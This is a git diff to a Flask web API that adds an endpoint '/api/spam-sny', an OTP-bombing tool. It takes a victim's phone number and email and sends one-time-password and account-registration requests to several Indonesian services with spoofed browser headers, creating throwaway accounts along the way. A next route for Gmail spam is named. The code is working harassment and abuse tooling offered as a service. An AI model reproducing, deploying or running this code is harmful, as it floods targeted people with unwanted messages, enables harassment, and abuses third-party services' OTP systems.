@@ -6,7 +6,6 @@ from flask_cors import CORS
 from io import BytesIO
 from bs4 import BeautifulSoup
 from github import Github
-import re
 import functools
 import jwt
 import requests
@@ -169,6 +168,65 @@ def generate_random_number(length):
 
 random_text = generate_random_string(5)
 random_number = generate_random_number(6)
+
+@app.route('/api/spam-sny', methods=['GET'])
+def get_spm_sny():
+    nomor = request.args.get('nomor')
+    # args emaol bersifat opsional
+    email = request.args.get('email', default=None)
+    apikey = request.args.get('apikey')
+
+    if not nomor:
+        return ({
+            "message":"Masukkan parameter 'nomor'"
+        })
+    if not apikey or not is_apikey_valid(apikey):
+        return jsonify({"error": "Invalid or expired API key, plese download new apikey"}), 401
+
+    api_url = "https://rest-api-flask-eosin.vercel.app/user-agent"
+    api_params = {"jum": 1, "apikey": "Hoshiyuki"}
+    api_response = requests.get(api_url, params=api_params)
+
+    if api_response.status_code == 200:
+        user_agents = api_response.json().get("user_agents", [])
+        user_agent = user_agents[0] if user_agents else "Default User Agent"
+        headsmart={'Host':'api.smartseller.co.id','content-length':'34','accept':'application/json, text/plain, */*','content-type':'application/json','sec-ch-ua-mobile':'?1','authorization':'Bearer Bearer','user-agent':user_agent,'sec-ch-ua-platform':'"Android"','origin':'https://app.smartseller.co.id','sec-fetch-site':'same-site','sec-fetch-mode':'cors','sec-fetch-dest':'empty','referer':'https://app.smartseller.co.id/','accept-encoding':'gzip, deflate, br','accept-language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
+        datasmart=json.dumps({"phone_number":"+62"+nomor})
+        possmart=requests.post("https://api.smartseller.co.id/api/otp/send",headers=headsmart,data=datasmart).text
+#
+        headers = {        'Host':'807garage.com',        'Connection':'keep-alive',        'Accept':'application/json',        'Content-Type':'application/json',        'sec-ch-ua-mobile':'?1',        'User-Agent':user_agent,        'Authorization':'U2FsdGVkX18vqd+U4IlnnKd7nQ3gLfuL5PZZEvpiRGsqwwmo+AJ+hmepyIQX8uaB8YnmMqePJ5N+35ZvJPnqQVjsMehG2QaRIs2PTBMOoNiH8K0y6qHRNzo5PWgtv7Bzm44FbNUOMqStwqF0zXKO7DUgMltKXsCnanz30xVjAfV0MSRYvfKQye30dHzAvXUnETrrZ6ILHnMPktsqmoFyRrxzaQt59eJdsqpXZDrsfK6HPAd4YuhdOxbwtXq6WpW8Ujq3lfqkrWNSUaflGVJIMDCFzQADEXlBoXWOFSUZN/asowkwdvyjnHmzHspcM72qgUtGRy1YPwapbWtPNtEf9bgNdoTUIk0+SoGHG/j6w7WhWYhp6xTc5O6PVl4Rw1/tgYlAulP+VXl7HOCfI9mgb3spypeAK/HqD1epOSwMUcnqfUwXvsyODIlfLOSzvpJbkX422kBOoScBiUZ1Tm4SdmGY4gMvYNbZ19324ClMCZLb+53i8OcS8K0PJ8vOemxN9DsfgcxbO3gNyH9UIwA3UpgP29sw1SPsddaWslzuU5P5IHYyG2uViogw20D7gfHOPktOMy//mbuogfwnKqbfaO8ExmBkadI/U2bXDGwGPz+azKooirvFOPu2pG3OXIE5qocWVovBFCNry5gKYjykZYXVZ6Hxw69Rn4jYb863RKxuj4lhHDHncrgFcNnubAgE49Gl1B3g+tH2bzIEnAt4E4VLdgGiMtDU+rKMK9rhHp2dzTqjJLYrSe5MKbnlnSuaBD6gFRZLZ5glY5X3EsmHiG2E3ZqC8uy4J8sclT35ZNHakPSnaNjwMkJVJ6AfP1s1',        'sec-ch-ua-platform':'"Android"',        'Origin':'https://807garage.com',        'Sec-Fetch-Site':'same-origin',        'Sec-Fetch-Mode':'cors',        'Sec-Fetch-Dest':'empty',        'Referer':'https://807garage.com/login',        'Accept-Encoding':'gzip, deflate, br',        'Accept-Language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
+        dat807=json.dumps({"phone_email":email})
+        response = requests.post("https://807garage.com/api/member/login_reg", headers=headers,data=dat807).text
+#
+        headsampi={"Host": "auth.sampingan.co", "domain-name": "auth-svc", "app-auth": "Skip","content-type": "application/json; charset=UTF-8", "user-agent": user_agent,"application/vnd.full+json": None, "accept": "application/json","content-type": "application/vnd.full+json", "content-type": "application/json","app-version": "2.1.2", "app-platform": "Android"}
+        sampi = requests.post("https://auth.sampingan.co/v1/otp", headers=headsampi, data=json.dumps({"channel": "WA", "country_code": "+62", "phone_number": nomor}).text
+#
+        datrupa = {    "name": random_text+" subrekammarBN",    "email": "akuntumbal8836@gmail.com",    "phone": "0"+nomor,    "password": "@mm4r"+random_text,    "confirmPassword": "@mm4r"+random_text,    "employeeCode": "",    "pin": random_number,    "pinConfirm": random_number,    "minicart_id": None}
+        register_url = "https://wapi.ruparupa.com/klk/register"
+        register_headers = {    'Host': 'wapi.ruparupa.com',    'content-length': '217',    'sec-ch-ua-mobile': '?0',    'user-agent': user_agent,    'content-type': 'application/json',    'x-company-name': 'ruparupa',    'accept': 'application/json',    'x-frontend-type': 'desktop',    'informa-b2b': 'false',    'user-platform': 'desktop',    'sec-ch-ua-platform': '"Linux"',    'origin': 'https://www.ruparupa.com',    'sec-fetch-site': 'same-site',    'sec-fetch-mode': 'cors',    'sec-fetch-dest': 'empty',    'referer': 'https://www.ruparupa.com/auth/register?action=register&component=profile-form-1',    'accept-encoding': 'gzip, deflate, br',    'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
+        register_response = requests.post(register_url, headers=register_headers, data=json.dumps(datrupa))
+        authorization_token = register_response.json()['data']['access_token']
+        otp_url = "https://wapi.ruparupa.com/klk/manage-otp-request"
+        otp_headers = {    'Host': 'wapi.ruparupa.com',    'content-length': '60',    'sec-ch-ua': '"Google Chrome";v="119", "Chromium";v="119", "Not?A_Brand";v="24"',    'sec-ch-ua-mobile': '?0',    'authorization': authorization_token,    'user-agent': user_agent,    'content-type': 'application/json',    'x-company-name': 'ruparupa',    'accept': 'application/json',    'x-frontend-type': 'desktop',    'informa-b2b': 'false',    'user-platform': 'desktop',    'sec-ch-ua-platform': '"Linux"',    'origin': 'https://www.ruparupa.com',    'sec-fetch-site': 'same-site',    'sec-fetch-mode': 'cors',    'sec-fetch-dest': 'empty',    'referer': 'https://www.ruparupa.com/',    'accept-encoding': 'gzip, deflate, br',    'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
+        otp_payload = {"otpRequestType": "verify-phone", "action": "onMountOrResend"}
+        otp_response = requests.post(otp_url, headers=otp_headers, data=json.dumps(otp_payload))
+#
+        pintar=requests.post("https://api.pintarnya.com/api/pk/auth/register/mobile",headers={'Host':'api.pintarnya.com','content-length':'27','sec-ch-ua':'"Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"','sec-ch-ua-mobile':'?1','authorization':'Bearer undefined','user-agent':user_agent,'content-type':'application/json','accept':'application/json, text/plain, */*','platform':'web-kerja','sec-ch-ua-platform':'"Android"','origin':'https://pintarnya.com','sec-fetch-site':'same-site','sec-fetch-mode':'cors','sec-fetch-dest':'empty','referer':'https://pintarnya.com/','accept-encoding':'gzip, deflate, br','accept-language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'},data=json.dumps({"mobile":"+62"+nomor})).text
+#
+        headdooit = {    "Host": "www.dooitwell.id",    "Content-Length": "36",    "Sec-Ch-UA": '"Google Chrome";v="119", "Chromium";v="119", "Not?A_Brand";v="24"',    "Accept": "application/json, text/plain, */*",    "Content-Type": "application/json;charset=UTF-8",    "Sec-Ch-UA-Mobile": "?1",    "User-Agent":user_agent,    "Sec-Ch-UA-Platform": '"Android"',    "Origin": "https://www.dooitwell.id",    "Sec-Fetch-Site": "same-origin",    "Sec-Fetch-Mode": "cors",    "Sec-Fetch-Dest": "empty",    "Referer": "https://www.dooitwell.id/register",    "Accept-Encoding": "gzip, deflate, br",    "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",}
+        payloaddooit = {"code": "+62", "phone": nomor}
+        responsedooit = requests.post("https://www.dooitwell.id/site/generateotp", headers=headdooit, json=payloaddooit).text
+        return jsonify({
+            "creator": "AmmarBN",
+            "status": True,
+            "version": "Beta",
+            "message": f"Success Sending to phone {nomor} and {email}"
+        })
+    else:
+         return ({
+             "code": 404,
+             "message": "Gagal Mengambil Data API"
+         })
 
 @app.route('/api/spam-gmail', methods=['GET'])
 def generate_mess_gmail():
